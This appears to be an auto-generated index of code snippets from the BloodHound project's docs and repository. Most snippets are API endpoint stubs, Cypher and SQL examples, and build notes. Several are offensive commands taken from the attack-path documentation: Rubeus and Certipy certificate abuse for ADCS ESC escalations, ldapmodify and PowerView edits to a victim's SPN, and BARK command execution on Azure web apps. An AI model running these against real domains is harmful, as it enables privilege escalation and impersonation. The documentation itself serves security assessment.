openapi\nCODE:\n```\nopenapi: put /api/v2/clients/{client_id}/token\n```\n\n----------------------------------------\n\nTITLE: Defining GET API endpoint for DCOM-enabled users in BloodHound\nDESCRIPTION: This OpenAPI specification defines a GET endpoint for retrieving users that have DCOM access to a specific computer. The endpoint requires an object_id parameter to identify the target computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-dcom-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/dcom-users\n```\n\n----------------------------------------\n\nTITLE: Executing Commands on Azure Web App\nDESCRIPTION: Demonstrates using BARK's Invoke-AzureRMWebAppShellCommand to execute a 'whoami' command on a target Web App using an ARM token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-website-contributor.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nInvoke-AzureRMWebAppShellCommand `\n    -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `\n    -Token $ARMToken `\n    -Command \"whoami\"\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for DCOM Rights in BloodHound\nDESCRIPTION: This OpenAPI specification defines the GET endpoint for retrieving DCOM rights for a specific user identified by their object_id. The endpoint path is '/api/v2/users/{object_id}/dcom-rights' and is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-dcom-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/dcom-rights\n```\n\n----------------------------------------\n\nTITLE: Defining POST Endpoint for File Upload in BloodHound API (OpenAPI)\nDESCRIPTION: OpenAPI specification for the file upload endpoint. It defines the POST route /api/v2/file-upload/{file_upload_job_id} for uploading files in the BloodHound application.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collection-uploads/upload-file-to-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/file-upload/{file_upload_job_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PUT Endpoint Definition for Asset Group Updates\nDESCRIPTION: Defines the OpenAPI specification for the PUT /api/v2/asset-groups/{asset_group_id} endpoint used to update an existing asset group in BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/update-an-asset-group.mdx#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nopenapi: put /api/v2/asset-groups/{asset_group_id}\n```\n\n----------------------------------------\n\nTITLE: Breaking Change Commit Example\nDESCRIPTION: Demonstrates how to format a commit message that includes breaking changes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-2.md#2025-04-23_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\nfeat(auth): Introduces required facial recognition sign in\\n\\nBREAKING CHANGE: The API endpoints for login and registration have changed.\\nCloses BED-5555\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification Path in YAML\nDESCRIPTION: Specifies the endpoint path for accessing the OpenAPI specification YAML file in BloodHound's API v2.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/api-info/get-api-spec.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/spec/openapi.yaml\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Domain Retrieval in OpenAPI\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves domain information by its object ID. This endpoint allows users to query detailed information about a specific domain in the BloodHound database.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Deleting Client Records in BloodHound API\nDESCRIPTION: OpenAPI specification for an endpoint that deletes a client record by its unique identifier. The endpoint requires the client_id as a path parameter and is available only in the Enterprise Edition of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/delete-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/clients/{client_id}\n```\n\n----------------------------------------\n\nTITLE: Markdown Code Block with Mute Command\nDESCRIPTION: Inline code block showing the mute command reference\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/mute-paths.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nMute\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Data Ingestion in BloodHound API\nDESCRIPTION: YAML snippet defining the OpenAPI specification for the POST /api/v2/ingest endpoint. This endpoint is used for ingesting data into BloodHound Enterprise Edition.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/client-ingest/endpoint-for-data-ingestion.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/ingest\n```\n\n----------------------------------------\n\nTITLE: Restoring SPN of Victim Computer Using ldapmodify in Linux\nDESCRIPTION: This command uses ldapmodify to restore the original Service Principal Name (SPN) of the victim computer in Linux environments after the attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certificate on Windows using Rubeus\nDESCRIPTION: Uses Rubeus to request a Ticket Granting Ticket from the domain using the PFX-formatted certificate. This allows the attacker to authenticate as a member of the targeted AD group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc13.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nRubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Finished Jobs in OpenAPI\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET request to the /api/v2/jobs/finished endpoint. It is used to retrieve information about completed jobs in the system.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/list-finished-jobs.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/jobs/finished\n```\n\n----------------------------------------\n\nTITLE: Removing Local BloodHound Deployment\nDESCRIPTION: Command to tear down a local BloodHound deployment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ skaffold delete -p local\n```\n\n----------------------------------------\n\nTITLE: Listing Beagle Extensions Directory\nDESCRIPTION: Shows the structure of the Beagle extensions directory.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ ls beagle/extensions\n__init__.py  build\n```\n\n----------------------------------------\n\nTITLE: Checking Victim's Mail Attribute (Linux)\nDESCRIPTION: Checks if the victim has the 'mail' attribute set using ldapsearch.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail\n```\n\n----------------------------------------\n\nTITLE: Acquiring ARM Token Using Refresh Token\nDESCRIPTION: Uses BARK's Get-ARMTokenWithRefreshToken function to obtain an Azure Resource Manager scoped JWT using a refresh token and tenant ID\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-aks-contributor.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `\n    -TenantID \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Restoring Original dNSHostName with PowerView in Windows\nDESCRIPTION: Restores the original dNSHostName of the victim computer after completing the attack to avoid disruption in the environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}\n```\n\n----------------------------------------\n\nTITLE: Implementing Search Bar Click Handler in JavaScript\nDESCRIPTION: A function that handles clicking the search bar entry element. Used to open the search functionality on the documentation page.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/home.mdx#2025-04-23_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nexport function openSearch() {\n  document.getElementById('search-bar-entry').click();\n}\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Certificate using Certipy (Linux)\nDESCRIPTION: Using Certipy on Linux to request a Ticket Granting Ticket (TGT) from the domain using the malicious certificate, specifying the domain controller IP.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx administrator.pfx -dc-ip 172.16.126.128\n```\n\n----------------------------------------\n\nTITLE: Formatting RFC Title and Optional Image in Markdown\nDESCRIPTION: Example of how to format the RFC title as a first-level heading in Markdown, followed by an optional image or high-level diagram.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n```markdown\n# BloodHound RFC Structure & Style Guide\n\n![xkcd comic - standards](https://imgs.xkcd.com/comics/standards.png)\n```\n```\n\n----------------------------------------\n\nTITLE: Type Checking Beagle Source with MyPy\nDESCRIPTION: Command to perform static type checking on the Beagle source code using MyPy.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n# From bhce source root\ncd packages/python/beagle\n\n~/beagle_venv/bin/mypy ./ \n```\n\n----------------------------------------\n\nTITLE: Querying All Nodes with Interleaved Comments in PostgreSQL\nDESCRIPTION: This snippet shows a PostgreSQL query similar to the previous one, but with comments interleaved within the query. It demonstrates how comments can be placed in various positions without affecting the query execution.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/test/translation_cases/README.md#2025-04-23_snippet_1\n\nLANGUAGE: postgresql\nCODE:\n```\nwith n1 as (select n1.* from node n1)\nselect * -- Comments may follow query content.\n-- Comments may also interleave with queries.\nfrom n1;\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format on Windows\nDESCRIPTION: Converts the obtained certificate to PFX format using certutil.exe. This step is necessary before using the certificate with Rubeus to request a TGT.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc13.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Generating ANTLR Grammar for openCypher in Bash\nDESCRIPTION: This command generates the ANTLR grammar from the openCypher XML sources. It uses the launch.sh script from the openCypher repository to create the Cypher.g4 file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n./tools/grammar/src/main/shell/launch.sh Antlr4 --INCLUDE_LEGACY=true cypher.xml > grammar/generated/Cypher.g4\n```\n\n----------------------------------------\n\nTITLE: Node Lookup without Label in Cypher\nDESCRIPTION: This Cypher query demonstrates a higher cost node lookup without a label. The analyzer adds weight to queries that don't bind node lookups to labels.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_2\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (n) return n;\n```\n\n----------------------------------------\n\nTITLE: Regenerating ANTLR Parser Implementation for Go in Bash\nDESCRIPTION: This command uses the ANTLR tool to generate a new version of the openCypher parser backend for Go. It requires Java to be installed and the ANTLR JAR file to be present.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\njava -jar ./antlr-4.13.0-complete.jar -Dlanguage=Go -o parser grammar/Cypher.g4\n```\n\n----------------------------------------\n\nTITLE: Defining PUT Endpoint for Job Cancellation in OpenAPI\nDESCRIPTION: OpenAPI specification defining the PUT endpoint path for cancelling a job using its ID. The endpoint follows the pattern /api/v2/jobs/{job_id}/cancel.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/cancels-a-scheduled-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/jobs/{job_id}/cancel\n```\n\n----------------------------------------\n\nTITLE: Querying All Nodes in PostgreSQL\nDESCRIPTION: This snippet demonstrates a simple PostgreSQL query that selects all columns from a subquery named 'n1'. It's equivalent to the Cypher query 'MATCH (n) RETURN n'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/test/translation_cases/README.md#2025-04-23_snippet_0\n\nLANGUAGE: postgresql\nCODE:\n```\nwith n1 as (select n1.* from node n1)\nselect *\nfrom n1;\n```\n\n----------------------------------------\n\nTITLE: Converting User Certificate to PFX Format (Windows)\nDESCRIPTION: Use certutil to convert the emitted user certificate to PFX format.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx\n```\n\n----------------------------------------\n\nTITLE: Complex Pattern Translation - OpenCypher to PostgreSQL\nDESCRIPTION: Shows translation of a complex OpenCypher pattern with multiple matches into PostgreSQL using scope management with sN naming convention.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_1\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (n), ()-[r]->() return n, r\n```\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0 from node n0),\n     s1 as (select s0.n0                                                                     as n0,\n                   (n1.id, n1.kind_ids, n1.properties)::nodecomposite                        as n1,\n                   (e0.id, e0.start_id, e0.end_id, e0.kind_id, e0.properties)::edgecomposite as e0,\n                   (n2.id, n2.kind_ids, n2.properties)::nodecomposite                        as n2\n            from s0,\n                 edge e0\n                     join node n1 on n1.id = e0.start_id\n                     join node n2 on n2.id = e0.end_id)\nselect s1.n0 as n, s1.e0 as r\nfrom s1;\n```\n\n----------------------------------------\n\nTITLE: Issuing Certificate Request for Another User (Linux)\nDESCRIPTION: Use Certipy with the enrollment agent certificate to issue a certificate request on behalf of another user in a Linux environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name\n```\n\n----------------------------------------\n\nTITLE: Removing Neo4j Volume in PowerShell\nDESCRIPTION: This PowerShell command removes the Neo4j data volume to reset the database without affecting application state.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/docker-compose/README.md#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\ndocker volume rm @(docker volume ls -q | Select-String neo4j-data)\n```\n\n----------------------------------------\n\nTITLE: Checking Computer Mail Attribute with ldapsearch in Linux\nDESCRIPTION: Uses ldapsearch to check if the victim computer has the mail attribute set, which might be required for certificate enrollment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail\n```\n\n----------------------------------------\n\nTITLE: Markdown Release Notes Documentation\nDESCRIPTION: Structured markdown documentation detailing release notes for BloodHound v5.6.0, including new features, bug fixes, and improvements across BloodHound, SharpHound, and AzureHound components.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/release-notes/2024-02-14-v5-6-0.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: 2024-02-14 Release Notes (v5.6.0)\n---\n\n## Announcements\n\n### Active Directory Certificate Services General Availability[](#h_01HEBK740C445N5AH02C96ZX8W)\n\nAD Certificate Services coverage in BloodHound is officially in General Availability with v5.6.0! To collect and process this information, ensure you're using the most recent version of SharpHound available from the \"Download Collectors\" view in your BloodHound environment!\n\nAs of this release, BloodHound provides coverage for:\n\n* GoldenCert (DPERSIST1 in the Certified Pre-Owned whitepaper)\n* ESC1\n* ESC3\n* ESC6a\n* ESC9a\n* ESC10a\n```\n\n----------------------------------------\n\nTITLE: Deleting SAML Provider Endpoint Definition in OpenAPI\nDESCRIPTION: Defines a DELETE endpoint for removing a SAML provider by its ID from the BloodHound system. The endpoint path includes a parameter for the SAML provider ID that needs to be deleted.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/delete-a-saml-provider.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/saml/providers/{saml_provider_id}\n```\n\n----------------------------------------\n\nTITLE: Rendering Navigation Cards in HTML\nDESCRIPTION: HTML markup for displaying two navigation cards with icons that link to training resources and community help sections\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/community-support/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<CardGroup>\n<Card title=\"Additional Training and Resources\" icon=\"brain\" iconType=\"solid\" horizontal href=\"/resources/community-support/training-resources\" />\n<Card title=\"Getting Help and the BloodHound Community\" icon=\"question\" iconType=\"solid\" horizontal href=\"/resources/community-support/getting-help\" />\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for SSO Provider Removal in OpenAPI\nDESCRIPTION: This YAML snippet specifies the OpenAPI route for deleting an SSO provider. It uses a path parameter 'sso_provider_id' to identify the specific provider to be removed.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/delete-sso-provider.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /api/v2/sso-providers/{sso_provider_id}\n```\n\n----------------------------------------\n\nTITLE: Creating KDS Root Key in PowerShell\nDESCRIPTION: Command to create a new KDS Root Key for the domain\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-KdsRootKey -EffectiveImmediately\n```\n\n----------------------------------------\n\nTITLE: Restoring Original SPN with PowerView in Windows\nDESCRIPTION: Restores the original Service Principal Name (SPN) of the victim computer after completing the attack to avoid disruption in the environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}\n```\n\n----------------------------------------\n\nTITLE: Displaying Upstream Repository URL for python-semver\nDESCRIPTION: Shows the GitHub URL for the upstream python-semver repository.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/beagle/semver/README.md#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://github.com/python-semver/python-semver\n```\n\n----------------------------------------\n\nTITLE: Structuring BloodHound Admin Documentation in Markdown\nDESCRIPTION: Front matter and structural markdown defining the administration documentation page layout, including title, description, and mode settings.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: Administration\ndescription: \"Administer a BloodHound instance and its related components: users, roles, authentication, collector status, and general security.\"\nmode: wide\nsidebarTitle: Overview\n---\n```\n\n----------------------------------------\n\nTITLE: Using Refresh Token with AzureHound (JSON)\nDESCRIPTION: This command uses a refresh token to authenticate and list all possible data from a specified tenant using AzureHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -r \"0.ARwA6Wg...\" list --tenant \"contoso.onmicrosoft.com\" -o output.json\n```\n\n----------------------------------------\n\nTITLE: Aggregating Values with REDUCE Clause\nDESCRIPTION: Demonstrates use of REDUCE to accumulate values along a path. Concatenates Weight properties from all elements in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_36\n\nLANGUAGE: cypher\nCODE:\n```\nSTART V = node(*)\nMATCH P = (T:Label)-[*]->(V)\nWHERE T.Target = true\nRETURN REDUCE(sum = '', X in P | sum + X.Weight)\n```"
  }
]